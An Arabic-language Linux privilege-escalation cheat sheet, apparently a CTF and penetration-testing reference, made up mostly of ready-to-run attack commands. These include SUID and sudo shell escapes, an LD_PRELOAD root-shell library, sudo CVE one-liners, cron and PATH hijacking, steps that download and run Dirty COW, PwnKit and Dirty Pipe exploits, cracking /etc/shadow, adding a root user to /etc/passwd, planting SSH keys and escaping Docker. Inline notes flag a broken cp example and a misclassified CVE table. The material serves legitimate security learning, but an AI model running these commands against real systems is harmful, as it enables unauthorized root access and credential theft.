<a id="-linux-privilege-escalation---complete-cheatsheet"></a>
# 🐧 تصعيد الصلاحيات في Linux - مرجع شامل

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗
  ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝
  ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝ 
  ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗ 
  ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗
  ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

> يعرض الرسم النصي العنوان بالإنجليزية؛ تصعيد الصلاحيات (Privilege Escalation) هو الانتقال إلى امتيازات أعلى نتيجة ثغرة أو إعداد غير آمن.

<p align="center">
  <img src="https://img.shields.io/badge/Linux-PrivEsc-red?style=for-the-badge" alt="Linux PrivEsc">
  <img src="https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge" alt="Post Exploitation">
  <img src="https://img.shields.io/badge/Root-Access-blue?style=for-the-badge" alt="Root">
  <img src="https://img.shields.io/badge/CTF-Ready-green?style=for-the-badge" alt="CTF">
</p>

<p align="center">
  <b>🔓 دليل شامل لتصعيد الصلاحيات في أنظمة Linux</b>
</p>

---

<a id="-table-of-contents"></a>
## 📋 المحتويات

- [جمع معلومات النظام (Enumeration)](#-enumeration)
- [SUID/SGID](#-suidsgid)
- [قدرات Linux ‏(Capabilities)](#-capabilities)
- [استغلال إعدادات sudo وثغراته](#-sudo-exploitation)
- [مهام Cron المجدولة](#-cron-jobs)
- [اختطاف مسار البحث PATH](#-path-hijacking)
- [تقييد هوية root في NFS ‏(Root Squashing)](#-nfs-root-squashing)
- [استغلال ثغرات النواة](#-kernel-exploits)
- [البحث عن كلمات المرور](#-password-mining)
- [مفاتيح SSH](#-ssh-keys)
- [ملفات قابلة للكتابة](#-writable-files)
- [الخروج من حاوية Docker](#-docker-escape)
- [مرجع سريع](#-quick-reference)

---

<a id="-enumeration"></a>
## 🔍 جمع معلومات النظام (Enumeration)

<a id="system-information"></a>
### معلومات النظام

```bash
# اسم المضيف
hostname

# نظام التشغيل والنواة
cat /etc/os-release
cat /etc/issue
uname -a
uname -r

# المعمارية
arch
uname -m

# معلومات المعالج
cat /proc/cpuinfo
lscpu
```

<a id="user-information"></a>
### معلومات المستخدمين

```bash
# المستخدم الحالي
whoami
id

# جميع المستخدمين
cat /etc/passwd
cat /etc/passwd | grep -v "nologin\|false"

# مجموعات المستخدمين
groups
cat /etc/group

# المستخدمون المتصلون حاليًا
w
who
users

# آخر عمليات تسجيل الدخول
last
lastlog

# صلاحيات sudo
sudo -l
```

<a id="network-information"></a>
### معلومات الشبكة

```bash
# عناوين IP
ip a
ifconfig

# مسارات التوجيه
ip route
route -n

# المنافذ المفتوحة
netstat -tulpn
ss -tulpn

# الاتصالات النشطة
netstat -an
ss -an

# ذاكرة ARP المؤقتة
arp -a
ip neigh

# DNS
cat /etc/resolv.conf

# المضيفون
cat /etc/hosts
```

<a id="process--services"></a>
### العمليات والخدمات

```bash
# العمليات قيد التشغيل
ps aux
ps -ef
ps aux | grep root

# الخدمات
systemctl list-units --type=service
service --status-all

# الحزم المثبتة
dpkg -l                    # Debian/Ubuntu
rpm -qa                    # RHEL/CentOS
```

<a id="scheduled-tasks"></a>
### المهام المجدولة

```bash
# جداول Cron
crontab -l
ls -la /etc/cron*
cat /etc/crontab
cat /etc/cron.d/*

# مؤقتات systemd
systemctl list-timers
```

---

<a id="-suidsgid"></a>
## 🔐 SUID/SGID

<a id="find-suid-binaries"></a>
### العثور على الملفات التنفيذية ذات SUID

```bash
# العثور على ملفات SUID
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# العثور على ملفات SGID
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# العثور على أي من النوعين
find / -perm /6000 -type f 2>/dev/null
```

> **توضيح للتوافق:** لا يعني وجود SUID أن كل مثال أدناه يعمل؛ يتوقف ذلك على البرنامج وطريقة احتفاظه بالامتيازات. يتجاهل Linux بتّي SUID وSGID على السكربتات المفسّرة، كما قد تمنع خيارات مثل nosuid وno_new_privs تأثير امتيازات الملف. [دليل Linux للاستدعاء execve](https://man7.org/linux/man-pages/man2/execve.2.html).

<a id="common-exploitable-suid-binaries"></a>
### ملفات تنفيذية شائعة يمكن استغلال SUID فيها

راجع [GTFOBins](https://gtfobins.github.io/) لمعرفة أساليب الاستغلال!

<a id="bash"></a>
#### **bash**
```bash
# إذا كان bash يحمل SUID
./bash -p
```

<a id="find"></a>
#### **find**
```bash
find . -exec /bin/sh -p \; -quit
```

<a id="vim"></a>
#### **vim**
```bash
vim -c ':!/bin/sh'
```

<a id="nmap-old-versions"></a>
#### **nmap** (إصدارات قديمة)
```bash
nmap --interactive
!sh
```

<a id="python"></a>
#### **python**
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

<a id="perl"></a>
#### **perl**
```bash
perl -e 'exec "/bin/sh";'
```

<a id="lessmore"></a>
#### **less/more**
```bash
less /etc/passwd
!/bin/sh
```

<a id="cp"></a>
#### **cp**
```bash
# نسخ /etc/passwd وإضافة مستخدم بصلاحيات root ثم إعادة النسخة
LFILE=/etc/passwd
cp /etc/passwd /tmp/passwd.bak
echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /tmp/passwd
cp /tmp/passwd $LFILE
```

> **ملاحظة على مثال cp:** يحتفظ المصدر بعبارة استبدال أمر داخل اقتباس مفرد، فتظل نصًا حرفيًا ولا تُنتج التجزئة المقصودة. كذلك ينشئ النسخة الاحتياطية باسم /tmp/passwd.bak، لكنه يضيف السطر إلى /tmp/passwd دون نسخ الملف الأصلي إليه في الخطوات المعروضة؛ لذا فالمثال غير مكتمل كما كُتب. احتُفظ بالأوامر حرفيًا. [دليل Bash للاقتباس المفرد](https://www.gnu.org/software/bash/manual/html_node/Single-Quotes.html).

<a id="env"></a>
#### **env**
```bash
env /bin/sh -p
```

---

<a id="-capabilities"></a>
## ⚡ قدرات Linux ‏(Capabilities)

<a id="find-capabilities"></a>
### العثور على قدرات الملفات

```bash
# قراءة قدرات الملفات
getcap -r / 2>/dev/null

# قدرات شائعة خطرة
# CAP_SETUID - تغيير معرّف المستخدم UID
# CAP_NET_RAW - مقابس شبكة خام
# CAP_DAC_READ_SEARCH - قراءة الملفات مع تجاوز فحوص صلاحيات DAC
```

<a id="exploit-capabilities"></a>
### استغلال القدرات

<a id="python-cap_setuid"></a>
#### **Python (cap_setuid)**
```bash
# إذا كان python يحمل cap_setuid+ep
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

<a id="perl-cap_setuid"></a>
#### **Perl (cap_setuid)**
```bash
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
```

<a id="tar-cap_dac_read_search"></a>
#### **tar (cap_dac_read_search)**
```bash
# قراءة أي ملف
tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat etc/shadow
```

<a id="vim-cap_setuid"></a>
#### **vim (cap_setuid)**
```bash
vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

---

<a id="-sudo-exploitation"></a>
## 🔑 استغلال إعدادات sudo وثغراته

<a id="check-sudo-permissions"></a>
### فحص صلاحيات sudo

```bash
sudo -l
# البحث عن قواعد NOPASSWD
# البحث عن قواعد (ALL) أو (root)
```

<a id="exploit-sudo"></a>
### استغلال sudo

<a id="sudo-all"></a>
#### **sudo ALL**
```bash
sudo /bin/bash
sudo su
```

<a id="ld_preload"></a>
#### **LD_PRELOAD**
```bash
# If env_keep+=LD_PRELOAD in sudo -l
# إنشاء مكتبة لتنفيذ المثال

cat > /tmp/shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/any_allowed_program
```

<a id="sudo-vim"></a>
#### **sudo vim**
```bash
sudo vim -c ':!/bin/sh'
```

<a id="sudo-lessmore"></a>
#### **sudo less/more**
```bash
sudo less /etc/passwd
!/bin/sh
```

<a id="sudo-find"></a>
#### **sudo find**
```bash
sudo find /tmp -exec /bin/sh \;
```

<a id="sudo-nmap-interactive"></a>
#### **sudo nmap** (الوضع التفاعلي)
```bash
sudo nmap --interactive
!sh
```

<a id="sudo-tar"></a>
#### **sudo tar**
```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

<a id="sudo-zip"></a>
#### **sudo zip**
```bash
sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/sh"
```

<a id="sudo-env"></a>
#### **sudo env**
```bash
sudo env /bin/sh
```

<a id="sudo-awk"></a>
#### **sudo awk**
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

<a id="sudo-man"></a>
#### **sudo man**
```bash
sudo man man
!/bin/sh
```

<a id="sudo-apache2"></a>
#### **sudo apache2**
```bash
sudo apache2 -f /etc/shadow
# يكشف السطر الأول من shadow
```

<a id="sudo-version-exploits"></a>
### ثغرات إصدارات sudo

```bash
# فحص الإصدار
sudo --version

# CVE-2019-14287 (sudo < 1.8.28)
sudo -u#-1 /bin/bash

# CVE-2021-3156 (Baron Samedit)
# sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
```

---

<a id="-cron-jobs"></a>
## ⏰ مهام Cron المجدولة

<a id="find-cron-jobs"></a>
### العثور على مهام Cron

```bash
# جدول Cron للنظام
cat /etc/crontab

# مجلدات Cron
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# جداول Cron للمستخدمين
cat /var/spool/cron/crontabs/*

# مراقبة مهام Cron
# استخدام pspy لمراقبة العمليات
```

<a id="exploit-cron-jobs"></a>
### استغلال مهام Cron

<a id="writable-cron-script"></a>
#### **سكربت Cron قابل للكتابة**
```bash
# إذا شغّل Cron سكربتًا يمكنك الكتابة إليه:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/script.sh

# انتظار تشغيل Cron، ثم:
/tmp/bash -p
```

<a id="wildcard-injection-tar"></a>
#### **الحقن عبر محارف البدل في tar**
```bash
# If cron runs: tar czf /tmp/backup.tar.gz *

# إنشاء ملفات المثال
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh
touch "/path/--checkpoint=1"
touch "/path/--checkpoint-action=exec=sh shell.sh"
```

<a id="path-exploitation"></a>
#### **استغلال PATH**
```bash
# إذا استخدم Cron مسارًا نسبيًا وكان بإمكانك التحكم في PATH
# Crontab shows: PATH=/home/user:/usr/local/bin:...
# Script calls: backup.sh (without full path)

# إنشاء سكربت بديل في مجلد قابل للكتابة ضمن PATH
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/backup.sh
chmod +x /home/user/backup.sh
```

---

<a id="-path-hijacking"></a>
## 🛤️ اختطاف مسار البحث PATH

<a id="find-vulnerable-scripts"></a>
### العثور على سكربتات قابلة للاستغلال

```bash
# البحث عن سكربتات يشغّلها root وتستخدم مسارات نسبية
# فحص سكربتات SUID
# فحص سكربتات Cron
# فحص خدمات systemd
```

<a id="exploit-path"></a>
### استغلال PATH

```bash
# إذا استدعى سكربت root الأمر 'service' دون مساره الكامل
# وكان بإمكانك التحكم في PATH:

# إنشاء بديل للأمر 'service' لتنفيذ المثال
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH

# تشغيل السكربت القابل للاستغلال
./vulnerable_script
```

---

<a id="-nfs-root-squashing"></a>
## 📁 تقييد هوية root في NFS ‏(Root Squashing)

<a id="find-nfs-shares"></a>
### العثور على مشاركات NFS

```bash
# على جهاز المختبِر
showmount -e target_ip

# فحص إعدادات التصدير
cat /etc/exports
# البحث عن no_root_squash
```

<a id="exploit-no_root_squash"></a>
### استغلال الخيار no_root_squash

```bash
# على جهاز المختبِر (بهوية root):
mkdir /tmp/nfs
mount -o rw target_ip:/share /tmp/nfs
cp /bin/bash /tmp/nfs/
chmod +s /tmp/nfs/bash

# على الجهاز الهدف:
/share/bash -p
```

---

<a id="-kernel-exploits"></a>
## 💣 استغلال ثغرات النواة

<a id="check-kernel-version"></a>
### فحص إصدار النواة

```bash
uname -r
uname -a
cat /proc/version
```

<a id="common-kernel-exploits"></a>
### ثغرات شائعة لتصعيد الصلاحيات

| CVE | إصدار النواة | الاسم |
|-----|----------------|------|
| CVE-2016-5195 | 2.x - 4.8.3 | **Dirty COW** |
| CVE-2021-4034 | All | **PwnKit** |
| CVE-2021-3156 | sudo < 1.9.5p2 | **Baron Samedit** |
| CVE-2022-0847 | 5.8 - 5.16.11 | **Dirty Pipe** |
| CVE-2022-2588 | 5.x | **DirtyCred** |

> **تصحيح للتصنيف:** يخلط جدول المصدر ثغرات النواة وثغرات برامج مساحة المستخدم؛ PwnKit يصيب pkexec ضمن polkit، وBaron Samedit يصيب sudo. لذلك لا تمثّل خانة إصدار النواة نطاق تأثرهما. أُبقيت القيم المختصرة كما وردت، ولا تكفي وحدها للحكم على نظام محدد. [إشعار Red Hat عن PwnKit](https://access.redhat.com/security/cve/cve-2021-4034)، [إشعار Red Hat عن sudo](https://access.redhat.com/security/cve/cve-2021-3156).

<a id="dirty-cow-cve-2016-5195"></a>
### Dirty COW (CVE-2016-5195)
```bash
# التنزيل والترجمة البرمجية
wget https://www.exploit-db.com/download/40839
gcc -pthread 40839.c -o dirty -lcrypt
./dirty
```

<a id="pwnkit-cve-2021-4034"></a>
### PwnKit (CVE-2021-4034)
```bash
# التنزيل
git clone https://github.com/ly4k/PwnKit
cd PwnKit
chmod +x PwnKit
./PwnKit
```

<a id="dirty-pipe-cve-2022-0847"></a>
### Dirty Pipe (CVE-2022-0847)
```bash
# فحص إصدار النواة أولًا
uname -r

# التنزيل والترجمة البرمجية
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
./exploit-1
```

---

<a id="-password-mining"></a>
## 🔑 البحث عن كلمات المرور

<a id="search-for-passwords"></a>
### البحث عن كلمات المرور

```bash
# داخل الملفات
grep -r "password" /home/ 2>/dev/null
grep -r "pass" /etc/ 2>/dev/null
grep -ri "password" /var/www/ 2>/dev/null

# ملفات الإعدادات
cat /var/www/html/wp-config.php
cat /var/www/html/config.php
cat /etc/mysql/my.cnf

# ملفات سجل الأوامر
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.nano_history

# متغيرات البيئة
env
printenv
```

<a id="password-files"></a>
### ملفات كلمات المرور

```bash
# ملف shadow (يتطلب صلاحية root عادةً)
cat /etc/shadow

# قيم تجزئة كلمات المرور من shadow
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt
```

<a id="common-locations"></a>
### مواضع شائعة

```bash
# إعدادات الويب
/var/www/html/wp-config.php
/var/www/html/config.php
/var/www/html/.htpasswd

# إعدادات قواعد البيانات
/etc/mysql/my.cnf
/etc/postgresql/*/main/pg_hba.conf

# SSH
/home/*/.ssh/id_rsa
/root/.ssh/id_rsa

# ملفات النسخ الاحتياطية
find / -name "*.bak" 2>/dev/null
find / -name "*.backup" 2>/dev/null
```

---

<a id="-ssh-keys"></a>
## 🔐 مفاتيح SSH

<a id="find-ssh-keys"></a>
### العثور على مفاتيح SSH

```bash
# المفاتيح الخاصة
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# المفاتيح العامة المصرّح لها
cat /home/*/.ssh/authorized_keys
cat /root/.ssh/authorized_keys
```

<a id="exploit-ssh-keys"></a>
### استغلال مفاتيح SSH

```bash
# إذا عثرت على مفتاح خاص قابل للقراءة:
chmod 600 id_rsa
ssh -i id_rsa user@localhost
ssh -i id_rsa root@localhost
```

<a id="add-your-ssh-key"></a>
### إضافة مفتاح SSH الخاص بك

```bash
# توليد المفتاح على جهاز المختبِر
ssh-keygen -t rsa -b 4096

# إذا كان بإمكانك الكتابة إلى authorized_keys:
echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
echo "YOUR_PUBLIC_KEY" >> /home/user/.ssh/authorized_keys
```

---

<a id="-writable-files"></a>
## 📝 ملفات قابلة للكتابة

<a id="critical-writable-files"></a>
### ملفات حساسة قابلة للكتابة

```bash
# فحص صلاحيات الكتابة
ls -la /etc/passwd
ls -la /etc/shadow
ls -la /etc/sudoers
```

<a id="exploit-writable-etcpasswd"></a>
### استغلال إمكانية الكتابة إلى /etc/passwd

```bash
# توليد تجزئة كلمة المرور
openssl passwd -1 -salt hacker password
# Result: $1$hacker$TzyKlv0/R/c28R.GAeLw.1

# إضافة مستخدم بصلاحيات root
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0::/root:/bin/bash' >> /etc/passwd

# تسجيل الدخول
su hacker
# Password: password
```

<a id="find-world-writable-files"></a>
### العثور على الملفات القابلة للكتابة للجميع

```bash
find / -writable -type f 2>/dev/null
find / -perm -222 -type f 2>/dev/null
find / -perm -o+w -type f 2>/dev/null

# مجلدات قابلة للكتابة للجميع
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
```

> **تصحيح لمعنى الفحوص:** يفحص `-writable` قدرة المستخدم الحالي على الكتابة، بينما تشترط `-perm -222` وجود بتات الكتابة للمالك والمجموعة والآخرين معًا؛ لذلك ليست هذه الصيغ مترادفة. أما `-perm -o+w` فيفحص بت الكتابة للآخرين. بقيت الأوامر الأصلية كما هي. [دليل GNU Findutils](https://www.gnu.org/software/findutils/manual/html_node/find_html/Mode-Bits.html).

---

<a id="-docker-escape"></a>
## 🐳 الخروج من حاوية Docker

<a id="check-if-in-docker"></a>
### التحقق من العمل داخل Docker

```bash
# التحقق من وجود .dockerenv
ls -la /.dockerenv

# فحص مجموعات التحكم cgroups
cat /proc/1/cgroup | grep docker

# فحص اسم المضيف (سلسلة عشوائية)
hostname
```

<a id="docker-socket-mount"></a>
### إتاحة مقبس Docker داخل الحاوية

```bash
# إذا كان docker.sock متاحًا داخل الحاوية
find / -name docker.sock 2>/dev/null
ls -la /var/run/docker.sock

# الخروج باستخدام مقبس Docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

<a id="privileged-container"></a>
### حاوية بصلاحيات موسعة (Privileged)

```bash
# إذا كانت الحاوية ذات صلاحيات موسعة
fdisk -l                    # عرض أقراص المضيف
mount /dev/sda1 /mnt
chroot /mnt
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

<a id="one-liner-enumeration"></a>
### جمع المعلومات بأوامر من سطر واحد

```bash
# معلومات سريعة عن النظام
id; hostname; uname -a; cat /etc/issue

# فحص سريع لملفات SUID
find / -perm -4000 -type f 2>/dev/null

# فحص سريع للقدرات
getcap -r / 2>/dev/null

# فحص سريع لـ sudo
sudo -l

# فحص سريع لمهام Cron
cat /etc/crontab; ls -la /etc/cron*

# بحث سريع عن كلمات المرور
grep -r "password" /home/ 2>/dev/null
```

<a id="automated-tools"></a>
### أدوات آلية

| الأداة | الوصف |
|------|-------------|
| **LinPEAS** | جمع معلومات شامل |
| **LinEnum** | جمع معلومات Linux |
| **linux-smart-enumeration** | LSE |
| **pspy** | مراقبة العمليات |

<a id="quick-wins-checklist"></a>
### قائمة التحقق للفرص السريعة

- [ ] `sudo -l` - فحص صلاحيات sudo
- [ ] الملفات التنفيذية ذات SUID - العثور عليها ومراجعة GTFOBins
- [ ] قدرات Linux ‏(Capabilities) - `getcap -r / 2>/dev/null`
- [ ] مهام Cron - هل سكربتاتها قابلة للكتابة؟
- [ ] إصدار النواة - هل توجد ثغرات معروفة؟
- [ ] إمكانية قراءة /etc/shadow
- [ ] إمكانية الكتابة إلى /etc/passwd
- [ ] مفاتيح SSH في /home/* أو /root
- [ ] إتاحة مقبس Docker داخل الحاوية
- [ ] مشاركة NFS مع الخيار no_root_squash

---

<a id="-resources"></a>
## 📚 مصادر

- [GTFOBins](https://gtfobins.github.io/)
- [تصعيد صلاحيات Linux من HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

<a id="related-cheatsheets"></a>
### مراجع سريعة ذات صلة
- [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
- [تصعيد الصلاحيات في Windows](../../Windows-PrivEsc/translations/README.ar.md)

> مرجع LinPEAS المحلي المذكور في المصدر غير موجود في هذه النسخة؛ يشير الرابط هنا إلى توثيق المشروع الرسمي.

---

<p align="center">
  <b>🐧 استكشاف الوصول إلى صلاحيات root!</b><br>
  <i>إتقان تصعيد الصلاحيات في Linux</i>
</p>
